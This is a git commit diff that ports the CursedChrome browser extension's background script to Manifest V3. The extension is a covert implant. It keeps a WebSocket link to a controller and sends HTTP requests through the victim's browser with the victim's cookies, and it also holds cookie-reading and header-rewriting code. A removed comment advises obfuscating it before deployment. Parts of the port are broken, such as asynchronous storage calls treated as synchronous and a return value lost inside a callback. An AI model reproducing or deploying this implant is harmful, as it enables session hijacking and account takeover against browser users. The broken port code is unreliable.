9862697073da448e4d256c8cbcbf6da384257c34
SuperStars0718 <georgejohnson11305@gmail.com>
2023-06-12 21:00:17 +0900

    convert cursedchrome extension from manefest v2 to v3

--- extension/src/bg/background.js
+++ extension/src/bg/background.js
@@ -1,20 +1,11 @@
-/*
-    IMPORTANT: This script should be minified using UglifyJS or
-    some other minimizer to remove comments/console.log statements
-    and to obfuscate the code before deployment.
-
-    You'll also need to modify the "websocket" variable in the
-    initialize() function in this script with the appropriate
-    connection URI for your host. For simple testing, the default
-    connection string of "ws://127.0.0.1:4343" should be fine.
-*/
-var websocket = false;
 var last_live_connection_timestamp = get_unix_timestamp();
+chrome.storage.sync.set({ last_live_connection_timestamp });
 var placeholder_secret_token = get_secure_random_token(64);
+chrome.storage.sync.set({ placeholder_secret_token });
 
 // Used as a table to hold the final metadata to return for
 // 301 requests which fetch() can't normally handle.
-var redirect_table = {};
+
 
 const REQUEST_HEADER_BLACKLIST = [
     'cookie'
@@ -24,11 +15,10 @@ const RPC_CALL_TABLE = {
     'HTTP_REQUEST': perform_http_request,
     'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
     'AUTH': authenticate,
-    'GET_COOKIES': get_cookies,
 };
 
 /*
-    Return an array of cookies for the current cookie store.
+Return an array of cookies for the current cookie store.
 */
 async function get_cookies(params) {
     // If the "cookies" permission is not available
@@ -38,6 +28,7 @@ async function get_cookies(params) {
     }
     return getallcookies({});
 }
+
 
 function getallcookies(details) {
     return new Promise(function(resolve, reject) {
@@ -53,33 +44,32 @@ function getallcookies(details) {
 
 async function authenticate(params) {
     // Check for a previously-set browser identifier.
-    var browser_id = localStorage.getItem('browser_id');
-
+    var browser_id="";
+    chrome.storage.sync.get(["browser_id"]).then((result) => {
+        browser_id = result;
+    });
     // If no browser ID is already set we generate a
     // new one and return it to the server.
-    if(browser_id === null) {
+    if(browser_id == "") {
         browser_id = uuidv4();
-        localStorage.setItem(
-            'browser_id',
-            browser_id
-        );
+        chrome.storage.sync.set({ 'browser_id': browser_id });
     }
-
+    
     /*
-        Return the browser's unique ID as well as
-        some metadata about the instance.
+    Return the browser's unique ID as well as
+    some metadata about the instance.
     */
-    return {
-        'browser_id': browser_id,
-        'user_agent': navigator.userAgent,
-        'timestamp': get_unix_timestamp()
+   return {
+       'browser_id': browser_id,
+       'user_agent': navigator.userAgent,
+       'timestamp': get_unix_timestamp()
     }
 }
 
 function get_secure_random_token(bytes_length) {
     const validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let array = new Uint8Array(bytes_length);
-    window.crypto.getRandomValues(array);
+    crypto.getRandomValues(array);
     array = array.map(x => validChars.charCodeAt(x % validChars.length));
     const random_string = String.fromCharCode.apply(null, array);
     return random_string;
@@ -91,6 +81,33 @@ function uuidv4() {
   );
 }
 
+function btoa(inputString) {
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+    var outputString = '';
+ 
+    for (var i = 0; i < inputString.length; i += 3) {
+       var byte1 = inputString.charCodeAt(i);
+       var byte2 = (i + 1 < inputString.length) ? inputString.charCodeAt(i + 1) : 0;
+       var byte3 = (i + 2 < inputString.length) ? inputString.charCodeAt(i + 2) : 0;
+ 
+       var b1 = byte1 >> 2;
+       var b2 = ((byte1 & 0x03) << 4) | (byte2 >> 4);
+       var b3 = ((byte2 & 0x0F) << 2) | (byte3 >> 6);
+       var b4 = byte3 & 0x3F;
+ 
+       if (!byte2) {
+          b3 = b4 = 64;
+       }
+       else if (!byte3) {
+          b4 = 64;
+       }
+ 
+       outputString += chars.charAt(b1) + chars.charAt(b2) + chars.charAt(b3) + chars.charAt(b4);
+    }
+ 
+    return outputString;
+ }
+
 function arrayBufferToBase64(buffer) {
     var binary = '';
     var bytes = new Uint8Array(buffer);
@@ -98,63 +115,18 @@ function arrayBufferToBase64(buffer) {
     for (var i = 0; i < len; i++) {
         binary += String.fromCharCode(bytes[i]);
     }
-    return window.btoa(binary);
+    return btoa(binary);
 }
 
 function get_unix_timestamp() {
     return Math.floor(Date.now() / 1000);
 }
 
-// Checks the websocket connection to ensure it's still live
-// If it's not, then we attempt a reconnect
-const websocket_check_interval = setInterval(() => {
-    const PENDING_STATES = [
-        0, // CONNECTING
-        2 // CLOSING
-    ];
 
-    // Check WebSocket state and make sure it's appropriate
-    if (PENDING_STATES.includes(websocket.readyState)) {
-        console.log(`WebSocket not in appropriate state for liveness check...`);
-        return
-    }
+chrome.alarms.create('myAlarm', {
+    periodInMinutes: 0.05
+});
 
-    // Check if timestamp is older than ~15 seconds. If it
-    // is the connection is probably dead and we should restart it.
-    const current_timestamp = get_unix_timestamp();
-    const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;
-
-    if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
-        console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);
-
-        try {
-            websocket.close();
-        } catch (e) {
-            // Do nothing.
-        }
-        initialize();
-        return
-    }
-
-    // Send PING message down websocket, this will be
-    // replied to with a PONG message form the server
-    // which will trigger a function to update the 
-    // last_live_connection_timestamp variable.
-
-    // If this timestamp gets too old, the WebSocket
-    // will be severed and started again.
-    websocket.send(
-        JSON.stringify({
-            'id': uuidv4(),
-            'version': '1.0.0',
-            'action': 'PING',
-            'data': {}
-        })
-    );
-}, (1000 * 3));
-
-// Headers that fetch() can't set which need to
-// utilize webRequest to be able to send properly.
 const HEADERS_TO_REPLACE = [
     'origin',
     'referer',
@@ -170,9 +142,9 @@ const HEADERS_TO_REPLACE = [
 async function perform_http_request(params) {
     // Whether to include cookies when sending request
     const credentials_mode = params.authenticated ? 'include' : 'omit';
+   
 
     // Set the X-PLACEHOLDER-SECRET to the generated secret.
-    params.headers['X-PLACEHOLDER-SECRET'] = placeholder_secret_token;
 
     // List of keys for headers to replace with placeholder headers
     // which will be replaced on the wire with the originals.
@@ -247,15 +219,17 @@ async function perform_http_request(params) {
             ''
         );
         const redirect_hack_id = response_metadata_string;
+        chrome.storage.sync.get([redirect_hack_id], function(redirect_table) {
+            const response_metadata = redirect_table[redirect_hack_id];
+            redirect_table[redirect_hack_id]=''
+            chrome.storage.sync.set( redirect_table);
 
-        const response_metadata = redirect_table[redirect_hack_id];
-        delete redirect_table[redirect_hack_id];
-
-        // Format headers
-        var redirect_hack_headers = {};
-        response_metadata.headers.map(header_data => {
-            // Original Set-Cookie may merge multiple headers, skip it
-            if (header_data.name.toLowerCase() !== 'set-cookie') {
+            
+            // Format headers
+            var redirect_hack_headers = {};
+            response_metadata.headers.map(header_data => {
+                // Original Set-Cookie may merge multiple headers, skip it
+                if (header_data.name.toLowerCase() !== 'set-cookie') {
                 if (header_data.name === 'X-Set-Cookie') {
                     redirect_hack_headers['Set-Cookie'] = JSON.parse(header_data.value);
                 }
@@ -263,17 +237,18 @@ async function perform_http_request(params) {
                     redirect_hack_headers[header_data.name] = header_data.value;
                 }
             }
+            });
+        
+            const redirect_hack_data = {
+                'url': response.url,
+                'status': response_metadata.status_code,
+                'status_text': 'Redirect',
+                'headers': redirect_hack_headers,
+                'body': '',
+            };
+            
+            return redirect_hack_data;
         });
-
-        const redirect_hack_data = {
-            'url': response.url,
-            'status': response_metadata.status_code,
-            'status_text': 'Redirect',
-            'headers': redirect_hack_headers,
-            'body': '',
-        };
-
-        return redirect_hack_data;
     }
 
     return {
@@ -287,7 +262,8 @@ async function perform_http_request(params) {
     }
 }
 
-function initialize() {
+
+ function initialize() {
     // Replace the below connection URI with whatever
     // the host details you're using are.
     // ** Ideal setup is the following **
@@ -299,41 +275,12 @@ function initialize() {
     // TLS/SSL port (this will make sure tools like little
     // snitch don't alert on a new port connection from Chrome).
     websocket = new WebSocket("ws://127.0.0.1:4343");
-
-    websocket.onopen = function(e) {
-        //websocket.send("My name is John");
-    };
-
-    websocket.onmessage = async function(event) {
-        // Update last live connection timestamp
-        last_live_connection_timestamp = get_unix_timestamp();
-
-        try {
-            var parsed_message = JSON.parse(
-                event.data
-            );
-        } catch (e) {
-            console.error(`Could not parse WebSocket message!`);
-            console.error(e);
-            return
-        }
-
-        if (parsed_message.action in RPC_CALL_TABLE) {
-            const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
-            websocket.send(
-                JSON.stringify({
-                    // Use same ID so it can be correlated with the response
-                    'id': parsed_message.id,
-                    'origin_action': parsed_message.action,
-                    'result': result,
-                })
-            )
-        } else {
-            console.error(`No RPC action ${parsed_message.action}!`);
-        }
-    };
-
-    websocket.onclose = function(event) {
+    
+    websocket.addEventListener('open', function() {
+        console.log('Connected');
+    });
+    websocket.addEventListener('close', function(event) {
+        console.log('Connection lost');
         if (event.wasClean) {
             console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
         } else {
@@ -341,143 +288,100 @@ function initialize() {
             // event.code is usually 1006 in this case
             console.log('[close] Connection died');
         }
-    };
-
-    websocket.onerror = function(error) {
+    });
+    websocket.addEventListener('message', async function(event) {
+        console.log('message',event.data);
+         // Update last live connection timestamp
+         last_live_connection_timestamp = get_unix_timestamp();
+         chrome.storage.sync.set({ last_live_connection_timestamp });
+ 
+ 
+         try {
+             var parsed_message = JSON.parse(
+                 event.data
+             );
+         } catch (e) {
+             console.error(`Could not parse WebSocket message!`);
+             console.error(e);
+             return
+         }
+ 
+         if (parsed_message.action in RPC_CALL_TABLE) {
+             const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
+             websocket.send(
+                 JSON.stringify({
+                     // Use same ID so it can be correlated with the response
+                     'id': parsed_message.id,
+                     'origin_action': parsed_message.action,
+                     'result': result,
+                 })
+             )
+         } else {
+             console.error(`No RPC action ${parsed_message.action}!`);
+         }
+    });
+    websocket.addEventListener('error', function(error) {
         console.log(`[error] ${error.message}`);
-    };
-}
-
-initialize();
-
-/*
-
-Some headers are not set correctly when set by fetch(), so instead a
-placeholder header of X-PLACEHOLDER-Placeholder-Header is set and then
-replaced via the webRequest API.
-
-For example, the "Origin" header is set to the Chrome extension ID. So
-the fetch() call sets the X-PLACEHOLDER-Origin header and the webRequest
-hook automatically deleted the X-PLACEHOLDER-Origin header and sets the
-Origin header to it's value.
-
-However, this opens up a security issue which could be exploited if a
-regular webpage made a request with X-PLACEHOLDER-Restricted-Header.
-In order to mitigate this the webRequest hooks also look for the header
-X-PLACEHOLDER-SECRET. This header contains a secret value which we set
-on all fetch() requests in order to verify they came from the extension
-and not from some other webpage.
-
-Additionally, for defense in depth, nothing that isn't initiated by the Chrome extension
-is actually processed.
-*/
-chrome.webRequest.onBeforeSendHeaders.addListener(
-    function(details) {
-        // Ensure we only process requests done by the Chrome extension
-        if(details.initiator !== location.origin.toString()) {
+    });
+    
+    return function interval(){
+        const PENDING_STATES = [
+            0, // CONNECTING
+            2 // CLOSING
+        ];
+        var {last_live_connection_timestamp} = chrome.storage.sync.get(["last_live_connection_timestamp"]);
+        // Check WebSocket state and make sure it's appropriate
+        
+        if (PENDING_STATES.includes(websocket.readyState)) {
+            console.log(`WebSocket not in appropriate state for liveness check...`);
             return
         }
+        // Check if timestamp is older than ~15 seconds. If it
+        // is the connection is probably dead and we should restart it.
+        const current_timestamp = get_unix_timestamp();
+        const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;
+        if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
+            console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);
+            try {
+                websocket.close();
+            } catch (e) {
+            // Do nothing.
+        }
+            initialize();
+            return
+        }
+        // Send PING message down websocket, this will be
+        // replied to with a PONG message form the server
+        // which will trigger a function to update the 
+        // last_live_connection_timestamp variable.
+        
+        // If this timestamp gets too old, the WebSocket
+        // will be severed and started again.
+        websocket.send(
+            JSON.stringify({
+                'id': uuidv4(),
+                'version': '1.0.0',
+                'action': 'PING',
+                'data': {}
+            })
+        );
+    }
 
-        var has_header_secret = false;
-        var header_keys_to_delete = [];
-        var headers_to_append = [];
+}
 
-    	details.requestHeaders.map(requestHeader => {
-    		if(requestHeader.name === 'X-PLACEHOLDER-SECRET' && requestHeader.value === placeholder_secret_token) {
-    			has_header_secret = true;
-    			header_keys_to_delete.push('X-PLACEHOLDER-SECRET');
-    		}
-    	});
+const interval = initialize();
 
-    	// If there's no secret header set with the
-    	// proper secret then quit out the proxy replacement.
-    	if(!has_header_secret) {
-    		return {
-	            cancel: false
-	        };
-    	}
 
-    	// Get headers to remove and headers to append
-    	details.requestHeaders.map(requestHeader => {
-    		if(!requestHeader.name.startsWith('X-PLACEHOLDER-SECRET') && requestHeader.name.startsWith('X-PLACEHOLDER-')) {
-    			header_keys_to_delete.push(requestHeader.name);
+chrome.alarms.create('myAlarm', {
+    periodInMinutes: 0.05
+});
 
-                // Skip the header if it's in the blacklist (e.g. Cookie)
-                if(REQUEST_HEADER_BLACKLIST.includes(requestHeader.name.replace('X-PLACEHOLDER-', '').toLowerCase())) {
-                    return
-                }
-
-    			headers_to_append.push({
-    				'name': requestHeader.name.replace('X-PLACEHOLDER-', ''),
-    				'value': requestHeader.value
-    			})
-    		}
-    	});
-
-    	// Remove headers
-    	details.requestHeaders = details.requestHeaders.filter(requestHeader => {
-    		return !header_keys_to_delete.includes(requestHeader.name);
-    	});
-
-    	// Add appended headers
-    	details.requestHeaders = details.requestHeaders.concat(
-    		headers_to_append
-    	);
-
-        return {
-        	requestHeaders: details.requestHeaders
-        };
-    }, {
-        urls: ["<all_urls>"]
-    }, ["blocking", "requestHeaders", "extraHeaders"]
-);
-
+chrome.alarms.onAlarm.addListener(async () => {
+    interval();
+});
 
 const REDIRECT_STATUS_CODES = [
     301,
     302,
     307
 ];
-
-chrome.webRequest.onHeadersReceived.addListener(function(details) {
-    // Ensure we only process requests done by the Chrome extension
-    if(details.initiator !== location.origin.toString()) {
-        return
-    }
-
-    // Rewrite Set-Cookie to expose it in fetch()
-    var cookies = []
-    details.responseHeaders.map(responseHeader => {
-        if(responseHeader.name.toLowerCase() === 'set-cookie') {
-            cookies.push(responseHeader.value);
-        }
-    });
-    if (cookies.length != 0) {
-        details.responseHeaders.push({
-          'name': 'X-Set-Cookie',
-          // We pack array of cookies into string and depack later.
-          // Otherwise multiple Set-Cookie headers would be merged together.
-          'value': JSON.stringify(cookies)
-        });
-    }
-
-    if(!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
-        return {
-            responseHeaders: details.responseHeaders
-        }
-    }
-
-    const redirect_hack_id = uuidv4();
-
-    redirect_table[redirect_hack_id] = JSON.parse(JSON.stringify({
-        'url': details.url,
-        'status_code': details.statusCode,
-        'headers': details.responseHeaders
-    }));
-
-    return {
-        redirectUrl: `${location.origin.toString()}/redirect-hack.html?id=` + redirect_hack_id
-    };
-}, {
-    urls: ["<all_urls>"]
-}, ["blocking", "responseHeaders", "extraHeaders"]);
